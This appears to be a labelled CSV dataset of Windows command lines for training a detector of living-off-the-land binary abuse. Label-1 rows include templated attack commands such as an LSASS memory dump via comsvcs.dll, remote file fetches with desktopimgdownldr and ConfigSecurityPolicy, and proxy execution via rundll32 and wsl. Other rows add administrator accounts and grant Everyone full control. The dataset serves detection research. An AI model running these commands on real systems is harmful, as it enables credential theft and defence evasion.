Command,Label
"echo.exe %DATE% %TIME% >> ""C:\Users\jofu\Desktop\sjinnszs.dll""",0
"findstr /C:""LdM79jy9uwpQ"" ""C:\Windows\rvgnpptq.dat""",0
"attrib +h ""C:\AppData\Logs\kbulk.dll""",0
"sc query | findstr ""SERVICE_NAME""",0
"C:\Windows\System32\attrib.exe +h ""C:\Users\hnutycc\Documents\Downloads\pddyhx.dll""",0
arp.exe -a,0
"fsutil.exe file layout ""D:\AppData\iiiba.ini""",0
"attrib.exe +h ""D:\Program Files\Program Files\jpellcoitn.dll""",0
net.exe user ofzpdcbb /add,0
"findstr /C:""ruCF40b9S1EY"" ""C:\Users\Logs\wlrqisw.exe""",0
"del ""D:\AppData\Program Files\dvrrb.sys"" /f /q",0
net.exe user ysiaijxj /add,0
netstat.exe -an,0
net.exe user jcmjdlxq /add,0
"move.exe ""C:\Users\Users\scfyzqjn.sys"" ""D:\Logs\Program Files\wwnigyxt.ini""",0
"dir.exe ""C:\Windows\Users"" /s /b",0
net user dxpqupdk /add,0
"findstr /C:""UuR4kRakaTrt"" ""D:\Temp\cwunklua.dll""",0
"dir.exe ""C:\Users\cwikajo\Pictures"" /s /b",0
"type.exe ""C:\Program Files\Logs\ntkyac.txt""",0
"C:\Windows\System32\mkdir.exe ""D:\Users\anmoqxs\Documents\Downloads""",0
ipconfig.exe /all,0
"icacls.exe ""D:\Windows\Program Files\cuvnouhc.log"" /grant Everyone:F",0
fsutil devdrv query [<volume path>],0
"del ""C:\Program Files\Temp\vwbqwtsae.log"" /f /q",0
"certutil.exe -hashfile ""D:\Windows\sfrckf.dll"" SHA256",0
net use Z: \\192.168.40.149\backup,0
"icacls.exe ""D:\Users\zlwsfh\Pictures\Pictures\gstxljwuyu.sys"" /grant Everyone:F",0
"fsutil.exe file layout ""D:\Windows\AppData\yhmpp.ini""",0
ping 192.168.188.166,0
"powershell -Command ""Get-ChildItem -Path C:\Logs\Windows -Recurse | Select-Object FullName, Length""",0
"attrib.exe +h ""D:\Logs\Windows\qylqaf.dll""",0
attrib.exe +r backup.dat,0
"attrib +h ""D:\Logs\pnpfxqjnxl.txt""",0
echo UOzEY60upPDL > D:\Windows\zvncdvkjn.log,0
"certutil.exe -hashfile ""C:\Program Files\AppData\sofstw.txt"" SHA256",0
net localgroup Administrators gkodgrau /add,0
"copy ""C:\Users\Windows\gcagiqtkh.log"" ""C:\AppData\oqivdtzvel.exe""",0
"icacls.exe ""C:\Temp\AppData\bhylv.sys"" /grant Everyone:F",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Windows\Logs\ixoexy.dat\"" \""C:\AppData\Temp\kibnbofaub.exe\"""" /sc daily /st 23:00",0
dir.exe C:\Temp,0
"C:\Windows\rmdir.exe ""C:\Users\drauhapg\Downloads"" /s /q",0
"del ""C:\AppData\Windows\eexcgdaiau.sys"" /f /q",0
"del ""C:\AppData\Temp\vfshvppret.sys"" /f /q",0
SQLToolsPS.exe -noprofile -command Start-Process {PATH:.exe},1
print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe},1
net.exe user ltnhcxig /add,0
"fsutil.exe file layout ""D:\Windows\kkfoex.dll""",0
"certutil.exe -hashfile ""D:\Users\Temp\qjxdqhwcwh.txt"" SHA256",0
attributes volume [{set | clear}] [{hidden | readonly | nodefaultdriveletter | shadowcopy}] [noerr],0
findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe,1
"fsutil.exe file layout ""D:\Program Files\Users\pmqclhoxx.dat""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Windows\Temp\ibzhan.ini\"" \""C:\AppData\moojqtuczz.log\"""" /sc daily /st 23:00",0
"move ""D:\AppData\Windows\hybavj.dat"" ""C:\Users\nqhiynkp\Desktop\bfdubhms.sys""",0
net use Z: \\192.168.180.5\public,0
echo.exe zXpr9qCYvhzq > C:\AppData\Users\yatpzo.ini,0
"rundll32 SHELL32.DLL,ShellExec_RunDLL {PATH:.exe} {CMD:args}",1
dir.exe C:\Program Files,0
Ldifde -i -f {PATH:.ldf},1
wmic.exe process list brief,0
net use Z: \\192.168.152.165\data,0
"move.exe ""D:\Users\znlpsznu\Pictures\Documents\hvujipfxvs.dll"" ""C:\Windows\yoswtt.sys""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Users\zjjfasod.dat\"" \""C:\Users\Windows\ymmjivt.dat\"""" /sc daily /st 23:00",0
"rmdir.exe ""D:\Users\Logs"" /s /q",0
Dxcap.exe -c {PATH_ABSOLUTE:.exe},1
"fsutil.exe file layout ""D:\Users\hxkietrg\Pictures\Desktop\tlqlknv.ini""",0
"C:\Windows\System32\powershell.exe -Command ""Get-ChildItem -Path C:\Users\rsycvqf\Downloads -Recurse | Select-Object FullName, Length""",0
set comspec={PATH_ABSOLUTE:.exe} & cscript c:\windows\system32\manage-bde.wsf,1
"del ""C:\Users\feisey.log"" /f /q",0
"powershell -Command ""Get-ChildItem -Path D:\Windows\Logs -Recurse | Select-Object FullName, Length""",0
"certutil -hashfile ""D:\Users\Temp\tfvpjsw.ini"" SHA256",0
echo.exe e5HetowiGCe8 > C:\Logs\fjtln.dat,0
assign e:,0
ping.exe 192.168.248.127,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Temp\vwjvqlm.exe\"" \""D:\Users\Windows\kjunkg.txt\"""" /sc daily /st 23:00",0
"E:\Windows\rmdir.exe ""C:\AppData\Program Files"" /s /q",0
wmic.exe process list brief,0
"del ""C:\Program Files\Windows\nuuxdwg.log"" /f /q",0
netstat.exe -an,0
net.exe use Z: \\192.168.89.163\public,0
"rmdir.exe ""D:\Program Files\Program Files"" /s /q",0
wmic.exe process list brief,0
C:\Windows\net.exe localgroup Administrators reeowftt /add,0
"fsutil file layout ""D:\Windows\Program Files\ymkuq.dat""",0
"attrib.exe +h ""C:\Users\exdf\Desktop\ihatqqmff.txt""",0
"findstr /C:""yNmqj4aUP20y"" ""C:\AppData\Users\rvfmfbx.ini""",0
ping 192.168.100.48,0
ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL},1
"eventcreate /t ERROR /id 201 /so winword /l application /d ""New src Winword in application log""",0
arp.exe -a,0
net.exe user axeyisfx /add,0
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\users\cpl.internal\desktop\asptest\ -f C:\users\cpl.internal\desktop\asptest\none -u,1
"C:\Windows\System32\type.exe ""C:\Users\fwyfc\Documents\Desktop\axtghzkgo.txt""",0
"type ""C:\AppData\vrudt.ini""",0
net.exe user bmtttqvn /add,0
C:\Windows\net.exe localgroup Administrators ioobthxs /add,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Windows\Logs\unifkbhwfk.sys\"" \""D:\Users\Program Files\egefy.sys\"""" /sc daily /st 23:00",0
net.exe use Z: \\192.168.43.104\public,0
"echo.exe %DATE% %TIME% >> ""D:\Logs\Users\deitfg.txt""",0
"del ""D:\Temp\wsrrpj.txt"" /f /q",0
rundll32 C:\windows\system32\comsvcs.dll MiniDump {LSASS_PID} dump.bin full,1
tasklist.exe /v,0
"powershell.exe -Command ""Get-Service""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\AppData\Users\yrzvcgu.log\"" \""C:\AppData\mhioe.sys\"""" /sc daily /st 23:00",0
"attrib.exe +h ""D:\Users\Logs\pbqalhsp.txt""",0
net.exe use Z: \\192.168.85.155\data,0
"C:\Windows\echo.exe %DATE% %TIME% >> ""C:\Logs\zapmw.log""",0
"type ""C:\Windows\Windows\gsqgxflao.exe""",0
"move.exe ""D:\Windows\Windows\zpvpfjevox.txt"" ""C:\Logs\Program Files\zaypag.log""",0
"attrib +h ""D:\Temp\vmfps.log""",0
"type ""D:\Temp\Users\yfwvb.exe""",0
"type.exe ""D:\Temp\Windows\klhsnxzg.dll""",0
net.exe localgroup Administrators sxibcity /add,0
"attrib.exe +h ""D:\Temp\qcnzlfokvt.ini""",0
C:\Windows\net.exe localgroup Administrators rdzupevq /add,0
"rmdir.exe ""C:\Windows\AppData"" /s /q",0
"C:\Windows\fsutil.exe file layout ""D:\Users\axjq\Pictures\rrldam.dat""",0
net localgroup Administrators eahqkdbm /add,0
"fsutil file layout ""D:\Program Files\Windows\xgyfzxrqum.ini""",0
"powershell.exe -Command ""Get-ChildItem -Path C:\Users\rzlb\Documents\Pictures -Recurse | Select-Object FullName, Length""",0
net.exe localgroup Administrators mexwrfhj /add,0
"certutil.exe -hashfile ""D:\Windows\Temp\ydyovtckbg.dll"" SHA256",0
"del ""C:\Users\Users\hcfdcyvt.exe"" /f /q",0
"certutil -hashfile ""C:\Program Files\okdubbkavh.exe"" SHA256",0
net.exe localgroup Administrators service /add,0
"powershell.exe -Command ""Get-ChildItem -Path D:\Logs -Recurse | Select-Object FullName, Length""",0
"certutil.exe -hashfile ""D:\Windows\Program Files\mospz.ini"" SHA256",0
echo.exe uN3NE4xx5aYi > C:\Windows\Temp\qmteoqlsr.txt,0
net.exe use Z: \\192.168.66.29\public,0
cmd.exe /c dir C:\Users\Documents,0
tasklist.exe /v,0
ping.exe 172.16.0.1,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Users\AppData\rkybtfrb.txt\"" \""D:\Logs\Program Files\fwkhv.dll\"""" /sc daily /st 23:00",0
ping 192.168.49.157,0
fsutil devdrv clearFiltersAllowed [[/f] D:\Program Files\Temp],0
"move.exe ""D:\Temp\Program Files\zkgvdko.log"" ""C:\Users\orwvjejh\Desktop\Desktop\jttzwzbrgo.log""",0
net.exe localgroup Administrators lbmiizbq /add,0
net.exe user uinguiob /add,0
"attrib.exe +h ""C:\Users\jjyiz\Desktop\Downloads\lpeyenfqoa.txt""",0
"findstr /C:""zxrC0ddHOySf"" ""D:\Users\womof.exe""",0
"icacls ""D:\Users\Logs\bnjkbiq.ini"" /grant Everyone:F",0
net.exe localgroup Administrators fevxgazn /add,0
"type ""C:\Users\vkekczzk\Downloads\Desktop\fzajbsxhfj.dat""",0
format volume [/FS:file-system] [/V:label] [/Q] [/L[:state]] [/A:size] [/C] [/I:state] [/X] [/P:passes] [/S:state],0
"del ""C:\Windows\AppData\ofjqd.dat"" /f /q",0
tasklist.exe /v,0
echo.exe 6W9KO8sDujTV > D:\AppData\Windows\ctyixdkrg.dll,0
create volume,0
"mkdir ""D:\Temp\Logs""",0
"move ""D:\Program Files\pjiaw.exe"" ""C:\AppData\Logs\wapqgwxub.txt""",0
net localgroup Administrators fkerhdol /add,0
"findstr.exe /C:""DGzxGMooy0T3"" ""C:\Logs\ldsyu.sys""",0
whoami.exe /all,0
"del ""C:\Temp\Program Files\bsehedktbi.dat"" /f /q",0
"del ""D:\Users\jzfqdsdgus.log"" /f /q",0
"move.exe ""C:\AppData\djjiier.dat"" ""C:\Users\xvwhdbwk.txt""",0
"dir.exe ""D:\Users\kmpjutqf\Documents""",0
"set ""SYSTEMROOT=C:\Windows\Temp"" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr",1
C:\Program Files\reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0
"dir ""D:\Users\snkhhhr\Documents"" /s /b",0
wmic.exe process list brief,0
delete lun [uninstall] [noerr],0
"move.exe ""D:\Logs\tkqlzuwrgg.sys"" ""D:\Logs\htlcyprnu.dll""",0
"dir ""D:\Users\egmdzh\Pictures\Downloads""",0
"dissociate targets 695 [,695 [,…]]",0
ping.exe 8.8.8.8,0
"copy ""C:\Users\hsgfnalh\Pictures\pnrkckfijp.ini"" ""D:\Users\Program Files\jetmngxrd.dat""",0
C:\Windows\System32\netsh.exe advfirewall show allprofiles,0
C:\Windows\echo.exe 1v4zwRSCrhAV > C:\Temp\Windows\puvpuoqwa.dll,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Logs\AppData\gcefahy.exe\"" \""D:\Windows\vpzlaa.log\"""" /sc daily /st 23:00",0
C:\Program Files (x86)\dir.exe C:\Users\Documents,0
"wsl.exe --exec bash -c ""{CMD}""",1
"attrib.exe +h ""C:\Users\vuiwkjd\Downloads\Downloads\ejdpqhc.txt""",0
wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u {PATH:.exe},1
"findstr.exe /C:""MNGJLWwnjYoK"" ""D:\Users\vjmul.sys""",0
"powershell.exe -Command ""Get-ChildItem -Path C:\Users\oxfcedps\Pictures -Recurse | Select-Object FullName, Length""",0
net user dbnenwlg /add,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Temp\Temp\urqrvrr.log\"" \""C:\Users\exweblbx.sys\"""" /sc daily /st 23:00",0
C:\Program Files (x86)\arp.exe -a,0
assign f:,0
"rmdir ""D:\AppData\AppData"" /s /q",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Users\vlsdgybh\Downloads\gvwetmb.dll\"" \""D:\Users\jmfclgp.log\"""" /sc daily /st 23:00",0
"type ""D:\Users\hiisv\Documents\Pictures\epfoiefp.log""",0
"del ""C:\Temp\Logs\bawxhcycdy.log"" /f /q",0
"fsutil file layout ""D:\Temp\AppData\poywjknjv.dll""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\AppData\Users\xyiyqr.txt\"" \""D:\AppData\AppData\vvgcezmwl.sys\"""" /sc daily /st 23:00",0
echo hj8tV2f0SwYe > D:\Users\Users\vtprpe.exe,0
"fsutil file layout ""D:\Windows\Temp\fmulrdyxfb.exe""",0
netsh.exe interface show interface,0
net.exe use Z: \\192.168.144.32\public,0
echo.exe Vq0H553B2pj0 > C:\Temp\Users\zerlm.ini,0
echo.exe 5F8HSS2LEoAm > D:\Logs\Logs\ugpvtni.txt,0
"rmdir.exe ""D:\Users\jmkgimcp\Documents\Downloads"" /s /q",0
"move ""D:\Users\ztzaddoaba.dat"" ""C:\Logs\qvnlkpije.exe""",0
"certutil -hashfile ""D:\AppData\kfacfvu.exe"" SHA256",0
cipher /w:{PATH_ABSOLUTE:folder},1
net.exe localgroup Administrators cozawhzc /add,0
"D:\Windows\move.exe ""C:\Users\qcqeyw\Desktop\Desktop\zioddopf.log"" ""C:\Logs\johgxci.dll""",0
C:\Program Files\net.exe localgroup Administrators guest /add,0
